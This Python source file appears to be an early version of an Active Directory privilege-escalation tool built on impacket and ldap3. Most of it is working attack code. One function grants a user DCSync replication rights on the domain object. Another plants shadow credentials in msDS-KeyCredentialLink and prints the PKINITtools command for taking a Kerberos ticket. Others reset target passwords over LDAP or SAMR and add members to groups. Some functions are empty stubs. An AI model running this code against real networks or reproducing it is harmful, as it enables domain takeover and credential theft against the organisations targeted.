import logging
import ldap3, binascii, impacket, random, string
from ldap3.extend.microsoft import addMembersToGroups, modifyPassword
from impacket.examples.ntlmrelayx.attacks import ldapattack
from impacket.examples.ntlmrelayx.utils import config
from impacket.ldap import ldaptypes
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime
from dsinternals.common.data.hello.KeyCredential import KeyCredential


class BloodyError(Exception):
    pass


class LDAPError(BloodyError):
    pass


class NoResultError(LDAPError):
    
    def __init__(self, search_base, ldap_filter):
        self.filter = ldap_filter
        self.base = search_base
        self.message = f'No object found in {self.base} with filter: {ldap_filter}'
        super().__init__(self.message)


class TooManyResultsError(LDAPError):

    def __init__(self, search_base, ldap_filter, entries):
        self.filter = ldap_filter
        self.base = search_base
        self.limit = 10
        self.entries = entries
        
        if len(self.entries) <= self.limit:
            self.results = "\n".join(entry['dn'] for entry in entries)
            self.message = f'{len(self.entries)} objects found in {self.base} with filter: {ldap_filter}\n'
            self.message += f'Please put the full target DN'
            self.message += f'Result of query: \n{self.results}'
        else:
            self.message = f"More than {self.limit} entries in {self.base} match {self.filter}"
            self.message += f'Please put the full target DN'

        super().__init__(self.message)


# Create an object ACE with the specified privguid and our sid
# accesstype should be specified as either a write property flag or access control (for extended attributes)
def create_object_ace(privguid, sid, accesstype):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = accesstype
    acedata['ObjectType'] = impacket.uuid.string_to_bin(privguid)
    acedata['InheritedObjectType'] = b''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace


def resolvDN(conn, identity):
    """
    Return the DN for the object based on the parameters identity
    The parameter identity can be:
      - a DN, in which case it it not validated and returned as is
      - a sAMAccountName
      - a GUID
      - a SID
    """

    if "dc=" in identity.lower():
        # identity is a DN, return as is
        # We do not try to validate it because it could be from another trusted domain
        return identity
    
    if "s-1-" in identity.lower():
        # We assume identity is an SID
        ldap_filter = f'(objectSid={identity})'
    elif "{" in identity:
        # We assume identity is a GUID
        ldap_filter = f'(objectGUID={identity})'
    else:
        # By default, we assume identity is a sam account name
        ldap_filter = f'(sAMAccountName={identity})'

    naming_context = conn.server.info.other['defaultNamingContext'][0]
    conn.search(naming_context, ldap_filter)

    if len(conn.response) < 1:
        raise NoResultError(naming_context, ldap_filter)

    if len(conn.response) > 1:
        raise TooManyResultsError(naming_context, ldap_filter, conn.response)

    res = conn.response[0]['dn']
    return res


def ldapConnect(url, domain, username, password, doKerberos):
    # Connect to LDAP
    s = ldap3.Server(url, get_info=ldap3.DSA)

    if doKerberos:
        c = ldap3.Connection(s, authentication=ldap3.SASL, sasl_mechanism=ldap3.KERBEROS, sasl_credentials=(ldap3.ReverseDnsSetting.REQUIRE_RESOLVE_ALL_ADDRESSES,))
    else:
        c = ldap3.Connection(s, user='%s\\%s' % (domain,username), password=password, authentication=ldap3.NTLM)
    
    c.bind()
    return c

def writeGpoDacl():
	return

def addComputer():
	return

def addUser():
	return

def addUserToGroup(conn, member, group):
    member_dn = resolvDN(conn, member)
    group_dn = resolvDN(conn, group)
    addMembersToGroups.ad_add_members_to_groups(conn, member_dn, group_dn, raise_error=True)


def addForeignObjectToGroup(conn, user_sid, group_dn):
    """
    Add foreign principals (users or groups), coming from a trusted domain, to a group
    Args: 
        foreign object sid
        group dn in which to add the foreign object
    """
    # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
    magic_user_dn = f"<SID={user_sid}>"
    addMembersToGroups.ad_add_members_to_groups(conn, magic_user_dn, group_dn, raise_error=True)


def addDomainSync(conn, sAMAccountName):

    # Query for the sid of our target user
    conn.search(conn.server.info.other['rootDomainNamingContext'], '(sAMAccountName=%s)' % sAMAccountName, attributes=['objectSid'])
    sid_object = ldaptypes.LDAP_SID(conn.entries[0]['objectSid'].raw_values[0])
    user_sid = sid_object.formatCanonical()


    # Set SD flags to only query for DACL
    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)

    # print_m('Querying domain security descriptor')
    conn.search(conn.server.info.other['rootDomainNamingContext'], '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
    entry = conn.entries[0]

    secDescData = entry['nTSecurityDescriptor'].raw_values[0]

    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

    # We need "control access" here for the extended attribute
    accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS

    # these are the GUIDs of the get-changes and get-changes-all extended attributes
    secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', user_sid, accesstype))
    secDesc['Dacl']['Data'].append(create_object_ace('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', user_sid, accesstype))

    dn = entry.entry_dn
    data = secDesc.getData()
    conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)

def changePassword(conn, target, new_pass):

    target_dn = resolvDN(conn, target)

    modifyPassword.ad_modify_password(conn, target_dn, new_pass, old_password=None)
    if conn.result['result'] == 0:
        print('Password changed successfully!')
    else:
        if conn.result['result'] == 50:
            raise Exception('Could not modify object, the server reports insufficient rights: ' + conn.result['message'])
        elif conn.result['result'] == 19:
            raise Exception('Could not modify object, the server reports a constrained violation: ' + conn.result['message'])
        else:
            raise Exception('The server returned an error: ' + conn.result['message'])

from impacket.dcerpc.v5 import samr, transport

def cryptPassword(session_key, password):

    try:
        from Cryptodome.Cipher import ARC4
    except Exception:
        print("Warning: You don't have any crypto installed. You need pycryptodomex")
        print("See https://pypi.org/project/pycryptodomex/")

    from impacket import crypto
    
    sam_user_pass = samr.SAMPR_USER_PASSWORD()
    encoded_pass = password.encode('utf-16le')
    plen = len(encoded_pass)
    sam_user_pass['Buffer'] = b'A'*(512-plen) + encoded_pass
    sam_user_pass['Length'] = plen
    pwdBuff = sam_user_pass.getData()

    rc4 = ARC4.new(session_key)
    encBuf = rc4.encrypt(pwdBuff)
    
    sam_user_pass_enc = samr.SAMPR_ENCRYPTED_USER_PASSWORD()
    sam_user_pass_enc['Buffer'] = encBuf
    return sam_user_pass_enc

def rpcChangePassword(domain, username, password, hostname, target, new_pass):

    rpctransport = transport.SMBTransport(hostname, filename=r'\samr')
    rpctransport.set_credentials(username, password, domain)
    dce = rpctransport.get_dce_rpc()
    from impacket.dcerpc.v5 import rpcrt
    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)

    server_handle = samr.hSamrConnect(dce, hostname + '\x00')['ServerHandle']
    domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)['DomainId']
    domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)['DomainHandle']   
    userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (target,))['RelativeIds']['Element'][0]
    opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)

    req = samr.SamrSetInformationUser2()
    req['UserHandle'] = opened_user['UserHandle']
    req['UserInformationClass'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
    req['Buffer'] = samr.SAMPR_USER_INFO_BUFFER()
    req['Buffer']['tag'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
    req['Buffer']['Internal5']['UserPassword'] = cryptPassword(b'SystemLibraryDTC', new_pass)
    req['Buffer']['Internal5']['PasswordExpired'] = 0

    resp = dce.request(req)
    resp.dump()

def setDontreqpreauth():
	return
def setRbcd():
	return
def setShadowCredentials(conn, sAMAccountName):

    ShadowCredentialsOutfilePath = None
    ShadowCredentialsExportType = 'PEM'
    ShadowCredentialsPFXPassword = None

    target_dn = resolvDN(conn, sAMAccountName)
    print("Generating certificate")
    certificate = X509Certificate2(subject=sAMAccountName, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
    print("Certificate generated")
    print("Generating KeyCredential")
    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
    print("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
    print("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
    results = None
    for entry in conn.response:
        if entry['type'] != 'searchResEntry':
            continue
        results = entry
    if not results:
        print('Could not query target user properties')
        return
    try:
        new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
        print(new_values)
        print("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
        conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
        if conn.result['result'] == 0:
            print("Updated the msDS-KeyCredentialLink attribute of the target object")
            if ShadowCredentialsOutfilePath is None:
                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                print("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
            else:
                path = ShadowCredentialsOutfilePath
            if ShadowCredentialsExportType == "PEM":
                certificate.ExportPEM(path_to_files=path)
                print("Saved PEM certificate at path: %s" % path + "_cert.pem")
                print("Saved PEM private key at path: %s" % path + "_priv.pem")
                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                print("Run the following command to obtain a TGT")
                print("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
            elif ShadowCredentialsExportType == "PFX":
                if ShadowCredentialsPFXPassword is None:
                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                    print("No pass was provided. The certificate will be store with the password: %s" % password)
                else:
                    password = ShadowCredentialsPFXPassword
                certificate.ExportPFX(password=password, path_to_file=path)
                print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                print("Must be used with password: %s" % password)
                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                print("Run the following command to obtain a TGT")
                print("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, '<DOMAIN>', sAMAccountName, path))
        else:
            if conn.result['result'] == 50:
                print('Could not modify object, the server reports insufficient rights: %s' % conn.result['message'])
            elif conn.result['result'] == 19:
                print('Could not modify object, the server reports a constrained violation: %s' % conn.result['message'])
            else:
                print('The server returned an error: %s' % conn.result['message'])
    except IndexError:
        print('Attribute msDS-KeyCredentialLink does not exist')
    return

